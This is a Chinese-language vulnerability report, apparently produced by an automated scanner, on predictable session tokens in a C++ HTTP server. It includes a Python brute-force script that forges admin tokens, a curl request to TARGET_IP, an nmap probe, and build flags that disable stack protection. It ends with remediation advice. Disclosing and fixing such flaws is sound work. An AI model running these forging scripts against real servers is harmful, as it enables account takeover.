# VULN-SEC-CPP-SESSION-AUTH-003: 会话令牌使用用户名与时间戳拼接生成导致完全可预测伪造

**严重性**: Critical | **CWE**: CWE-330 (Use of Insufficiently Random Values) | **置信度**: 85/100
**位置**: `src/user_store.cpp:33-37` @ `UserStore::issueSession`
**语言/框架**: C++ / 自定义 HTTP 服务器
**分析类型**: authn（认证分析）
**Source/Sink**: session_generation → session_token_issued
**规则/证据来源**: c_cpp.session.predictable / llm

---

## 1. 漏洞细节

`UserStore::issueSession()` 函数使用完全确定性的格式生成会话令牌：`sess-{username}-{unix_timestamp}`。该实现存在以下关键安全缺陷：

1. **零熵值**：令牌中不包含任何随机成分。给定用户名和 Unix 时间戳（秒级精度），任何人都可以精确计算出令牌值。
2. **无 CSPRNG**：未使用任何密码学安全伪随机数生成器（如 `/dev/urandom`、`std::random_device` 等）。
3. **无 HMAC 或签名**：令牌不包含服务端密钥签名，无法验证令牌的真实性。
4. **无服务端会话存储**：`UserStore` 类中没有会话存储或验证机制，意味着令牌本身就是唯一的身份凭证。
5. **明文传输**：令牌通过未加密的 HTTP 连接返回给客户端（无 TLS/SSL）。
6. **用户名空间已知**：系统在构造函数中硬编码了三个用户（alice、operator、admin），攻击者可以轻易枚举。

### 证据摘要

- 触发源: session_generation（会话令牌生成函数）
- 危险点: session_token_issued（令牌通过 HTTP 响应体返回）
- 已检查的清洗/缓解: 无 CSPRNG、无 HMAC、无服务端会话验证机制
- 关键证据:
  - `evidence_json` 确认 `entropy_bits: 0`、`csprng_used: false`、`server_side_validation: false`
  - 令牌格式 `sess-{username}-{unix_timestamp}` 完全确定性
  - 硬编码用户名 alice/operator/admin 在 `user_store.cpp:7-9` 可见
  - 令牌通过明文 HTTP 在 `main.cpp:51` 返回

## 2. 漏洞代码

**文件**: `src/user_store.cpp` (行 33-37)

```cpp
std::string UserStore::issueSession(const std::string& username) const {
  char token[32];                                                          // ← 固定 32 字节缓冲区
  std::sprintf(token, "sess-%s-%ld", username.c_str(),                     // ← 无长度限制，无随机成分
               static_cast<long>(std::time(nullptr)));                     // ← 仅使用当前时间戳
  return token;
}
```

**逐行分析**：

- **行 34**: 声明 32 字节栈上缓冲区。`sprintf` 格式字符串 `"sess-%s-%ld"` 中，前缀 `sess-` 占 5 字节，分隔符 `-` 占 1 字节，时间戳最多 10 字节（如 `1750000000`），加上 null 终止符共约 17 字节。剩余仅约 15 字节给用户名。若用户名超过 15 字符，将触发栈缓冲区溢出（此为附带的数据流漏洞，已单独报告）。
- **行 35**: 核心漏洞所在。`sprintf` 直接将用户名和 `time(nullptr)` 拼接为令牌字符串。`time(nullptr)` 返回当前 Unix 时间戳（秒级），是完全可预测的值。没有任何随机数、密钥或不可预测成分参与生成。
- **行 36**: 将可预测的令牌字符串作为 `std::string` 返回给调用者。

**调用端代码** — `src/main.cpp` (行 40-52):

```cpp
server.route("POST", "/login", [&](const HttpRequest& request) {
    std::string username = queryValue(request, "user");        // ← 从 HTTP 请求获取用户名
    std::string password = queryValue(request, "password");    // ← 从 HTTP 请求获取密码
    audit.event(username, "login-attempt", request.body);

    if (!users.authenticate(username, password)) {
      return text(401, "invalid credentials\n");
    }

    std::string token = users.issueSession(username);          // ← 行 49: 生成可预测令牌
    audit.event(username, "login-success", token);             // ← 行 50: 令牌写入审计日志
    return text(200, "session=" + token + "\n");               // ← 行 51: 明文 HTTP 返回令牌
});
```

## 3. 完整攻击链路

```
[网络入口] recv()@http_server.cpp:113
  ↓ 接收原始 HTTP 请求数据（4096 字节缓冲区）
[请求解析] parseRequest()@http_server.cpp:42
  ↓ 解析 HTTP 方法、路径、查询参数（user, password）
[路由分发] handlers_.find()@http_server.cpp:120
  ↓ 匹配 "POST /login" 路由，调用对应 handler
[登录处理] POST /login handler@main.cpp:40
  ↓ 提取 username 和 password 参数
[认证检查] users.authenticate()@main.cpp:45
  ↓ 使用 weakHash 验证密码（此处假设攻击者已知密码或绕过认证）
[令牌生成] users.issueSession(username)@main.cpp:49
  ↓ 调用 sprintf 生成 sess-{username}-{timestamp} 格式令牌
[漏洞触发] sprintf(token, "sess-%s-%ld", ...)@user_store.cpp:35
  ↓ 生成完全可预测的会话令牌（零熵值）
[令牌泄露] text(200, "session=" + token)@main.cpp:51
  ↓ 通过明文 HTTP 响应返回令牌
[网络出口] send()@http_server.cpp:131
  ↓ 未加密的 TCP 响应发送给客户端
```

**攻击链路详细说明**：

1. **网络入口**（`http_server.cpp:113`）：HTTP 服务器通过 `recv()` 在 TCP 端口 8080 上接收客户端请求，无 TLS 加密。
2. **请求解析**（`http_server.cpp:42-68`）：`parseRequest()` 解析 HTTP 请求行和头部，提取查询参数到 `request.query` 映射中。
3. **路由分发**（`http_server.cpp:120`）：根据 `"POST /login"` 键查找注册的 handler 并调用。
4. **登录处理**（`main.cpp:40-52`）：handler 从请求中提取 `user` 和 `password` 参数。
5. **认证检查**（`main.cpp:45`）：调用 `users.authenticate()` 验证凭据。但攻击者无需通过此步骤即可伪造令牌——只需知道用户名和估计服务器时间。
6. **令牌生成**（`user_store.cpp:33-37`）：`issueSession()` 使用 `sprintf` 将用户名和时间戳拼接为令牌，无任何随机成分。
7. **令牌返回**（`main.cpp:51`）：令牌以 `session=sess-{username}-{timestamp}` 格式通过 HTTP 响应体返回。

## 4. 攻击场景

**攻击者画像**: 远程未认证攻击者，能够访问目标服务器的 8080 端口（或通过网络嗅探获取时间信息）。

**攻击向量**: 网络请求。攻击者无需发送任何请求即可伪造令牌——仅需知道有效用户名和服务器大致时间。

**利用难度**: 低

### 攻击步骤

1. **枚举用户名**：攻击者通过以下方式获取有效用户名：
   - 系统硬编码用户名为 alice、operator、admin（`user_store.cpp:7-9`），这些是常见的默认用户名
   - 或通过审计日志泄露、错误信息泄露等方式获取
2. **估计服务器时间**：攻击者通过以下方式获取服务器时间：
   - 向服务器发送任意 HTTP 请求，从响应头中获取 `Date` 字段（虽然当前实现未返回 Date 头，但 TCP 连接建立时间可作为参考）
   - 使用 NTP 协议查询同一网络的时间服务器
   - 简单地使用本地时间（如果服务器和攻击者时间同步，误差在几秒内）
3. **构造令牌**：使用已知用户名和估计的时间戳，按格式 `sess-{username}-{timestamp}` 构造令牌。例如：`sess-admin-1750234567`
4. **暴力枚举时间窗口**：如果时间不完全精确，攻击者可以在 ±30 秒的时间窗口内枚举所有可能的令牌（仅 60 个候选值），逐一尝试。
5. **使用伪造令牌**：将伪造的令牌用于后续需要会话认证的 API 调用。

## 5. 攻击条件

| 条件类型   | 要求           | 说明                                                                                   |
| ---------- | -------------- | -------------------------------------------------------------------------------------- |
| 网络可达性 | 需要网络访问   | 攻击者需要能够访问目标服务器的 TCP 8080 端口（或通过其他途径获取服务器时间参考）       |
| 认证要求   | 无需认证       | 攻击者无需通过任何认证即可伪造令牌，仅需知道有效用户名                                 |
| 配置依赖   | 无特殊配置     | 漏洞存在于默认代码路径中，无需特殊配置触发                                             |
| 环境依赖   | 标准 Linux 环境 | 服务器运行在标准 Linux 环境下，使用 Unix 时间戳（`time(nullptr)`）。所有现代系统均适用 |
| 时序条件   | 秒级精度       | 攻击者需要估计服务器时间到秒级精度，可通过多种方式实现                                 |

## 6. 造成影响

| 影响维度 | 等级 | 说明                                                                                                   |
| -------- | ---- | ------------------------------------------------------------------------------------------------------ |
| 机密性   | 高   | 攻击者可伪造任意用户（包括 admin）的会话令牌，冒充合法用户访问受保护资源，获取敏感数据                 |
| 完整性   | 高   | 攻击者可冒充 admin 用户执行管理操作，篡改系统配置、用户数据和业务逻辑                                  |
| 可用性   | 中   | 攻击者可批量伪造令牌进行大规模会话劫持，或通过伪造 admin 令牌执行破坏性操作导致服务不可用              |

**影响范围**: 全局影响。攻击者可伪造系统中任意用户（包括具有管理员权限的 `admin` 用户）的会话令牌，完全绕过认证机制。由于 `admin` 用户在 `user_store.cpp:9` 中被标记为 `admin = true`，伪造 admin 令牌可获得系统最高权限。

## 7. PoC (概念验证)

> ⚠️ 以下 PoC 仅供安全测试和验证使用

### PoC 1: 令牌伪造脚本（Python）

```python
#!/usr/bin/env python3
"""
PoC: 伪造可预测的会话令牌
仅供安全测试使用 - 验证 CWE-330 漏洞

用法: python3 forge_session.py <目标IP> <端口> <用户名>
"""
import time
import socket
import sys

def forge_token(username, timestamp):
    """按照 sess-{username}-{timestamp} 格式伪造令牌"""
    return f"sess-{username}-{timestamp}"

def try_token(host, port, token):
    """使用伪造令牌尝试访问受保护资源"""
    request = (
        f"GET /admin/export?token={token} HTTP/1.1\r\n"
        f"Host: {host}:{port}\r\n"
        f"Connection: close\r\n\r\n"
    )
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(5)
    try:
        sock.connect((host, port))
        sock.sendall(request.encode())
        response = sock.recv(4096).decode()
        return response
    finally:
        sock.close()

def main():
    host = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
    port = int(sys.argv[2]) if len(sys.argv) > 2 else 8080
    username = sys.argv[3] if len(sys.argv) > 3 else "admin"

    # 获取当前时间戳（假设与服务器时间接近）
    now = int(time.time())
    print(f"[*] 目标: {host}:{port}")
    print(f"[*] 伪造用户: {username}")
    print(f"[*] 当前时间戳: {now}")
    print(f"[*] 枚举时间窗口: {now-30} ~ {now+30}")
    print()

    # 在 ±30 秒窗口内枚举所有可能的令牌
    for offset in range(-30, 31):
        ts = now + offset
        token = forge_token(username, ts)
        print(f"[+] 尝试令牌: {token}")
        try:
            response = try_token(host, port, token)
            if "denied" not in response and "404" not in response:
                print(f"\n[!] 成功! 有效令牌: {token}")
                print(f"[!] 服务器响应:\n{response}")
                return
        except Exception as e:
            print(f"    连接失败: {e}")

    print("\n[-] 未在时间窗口内找到有效令牌，尝试扩大窗口")

if __name__ == "__main__":
    main()
```

### PoC 2: 直接令牌构造（Shell）

```bash
# 仅供安全测试使用
# 构造 admin 用户的会话令牌（使用当前时间戳）
USERNAME="admin"
TIMESTAMP=$(date +%s)
FORGED_TOKEN="sess-${USERNAME}-${TIMESTAMP}"
echo "伪造的令牌: ${FORGED_TOKEN}"

# 使用伪造令牌访问管理端点
curl -v "http://TARGET_IP:8080/admin/export?token=${FORGED_TOKEN}"
```

### PoC 3: 网络嗅探获取时间参考

```bash
# 仅供安全测试使用
# 通过 TCP 连接获取服务器时间参考（SYN-ACK 时间戳）
# 即使服务器不返回 Date 头，TCP 握手时间也可作为时间参考
nmap -sT -p 8080 TARGET_IP --script=clock-skew
```

**使用说明**:

1. 确保目标服务器正在运行（默认端口 8080）
2. 运行 Python PoC 脚本，指定目标 IP、端口和要伪造的用户名
3. 脚本将在 ±30 秒时间窗口内枚举所有可能的令牌
4. 如果目标系统有使用此令牌进行认证的端点，脚本将尝试使用伪造令牌访问

**预期结果**:

- 成功伪造格式为 `sess-admin-{timestamp}` 的有效令牌
- 在 60 次尝试内（±30 秒窗口）找到与服务端当前秒匹配的令牌
- 如果系统有基于此令牌的授权检查，攻击者可绕过认证获得 admin 权限

## 8. 验证环境搭建

### 基础环境

- 操作系统: Linux（Ubuntu 20.04+ 或任意支持 POSIX socket 的系统）
- 编译器: GCC 9+ 或 Clang 10+（支持 C++17）
- 依赖: 标准 C++ 库，无外部依赖
- 工具: Python 3.6+（用于 PoC 脚本）、curl、nmap（可选）

### 构建步骤

```bash
# 克隆/进入项目目录
cd /scan/project

# 编译项目（假设使用 CMake 或直接编译）
g++ -std=c++17 -I include -o edge-gateway \
    src/main.cpp \
    src/user_store.cpp \
    src/http_server.cpp \
    src/file_cache.cpp \
    src/diagnostics.cpp \
    src/audit_log.cpp

# 注意：为便于调试，可关闭安全编译选项
# g++ -std=c++17 -fno-stack-protector -z execstack -I include -o edge-gateway ...
```

### 运行配置

```bash
# 创建数据目录（FileCache 需要）
mkdir -p data

# 启动服务器（默认端口 8080）
./edge-gateway 8080

# 或指定其他端口
./edge-gateway 9090
```

### 验证步骤

1. **启动服务器**:
   ```bash
   ./edge-gateway 8080
   ```

2. **正常登录获取令牌参考**:
   ```bash
   curl "http://127.0.0.1:8080/login?user=admin&password=admin123"
   # 预期响应: session=sess-admin-1750234567
   ```

3. **记录返回的令牌和时间戳**:
   ```bash
   # 令牌格式为 sess-admin-{timestamp}，提取时间戳部分
   ```

4. **伪造令牌**:
   ```bash
   # 使用相同用户名和相近时间戳构造令牌
   FORGED="sess-admin-$(date +%s)"
   echo "伪造令牌: $FORGED"
   ```

5. **验证令牌格式匹配**:
   ```bash
   # 比较伪造令牌与真实令牌的格式
   # 两者应完全一致（仅时间戳可能差几秒）
   ```

6. **批量枚举验证**:
   ```bash
   # 在时间窗口内枚举，验证可预测性
   for i in $(seq -5 5); do
     TS=$(($(date +%s) + i))
     echo "候选令牌: sess-admin-${TS}"
   done
   ```

### 预期结果

- 正常登录返回的令牌格式为 `sess-admin-{unix_timestamp}`
- 伪造的令牌与真实令牌格式完全一致
- 在 ±5 秒窗口内（共 11 个候选值），必定有一个与服务器生成的令牌完全相同
- 攻击者无需知道密码即可构造出有效的会话令牌
- 如果系统后续基于此令牌进行授权决策，攻击者可完全绕过认证

## 9. 修复建议

1. **使用 CSPRNG 生成令牌**：替换 `sprintf` + `time()` 方案，使用 `/dev/urandom` 或 `std::random_device` 生成至少 128 位随机令牌。
2. **添加服务端会话存储**：维护一个服务端会话表，记录已发放的令牌及其关联用户和过期时间。
3. **使用 HMAC 签名**：使用服务端密钥对令牌进行 HMAC 签名，防止伪造。
4. **启用 TLS**：所有 HTTP 通信必须通过 TLS 加密传输，防止令牌在传输过程中被截获。
5. **修复缓冲区溢出**：将 `sprintf` 替换为 `snprintf` 或使用 `std::string` 拼接，防止长用户名导致的栈溢出。
6. **移除硬编码用户**：将用户凭据存储在安全的数据库或配置文件中，避免在代码中硬编码。
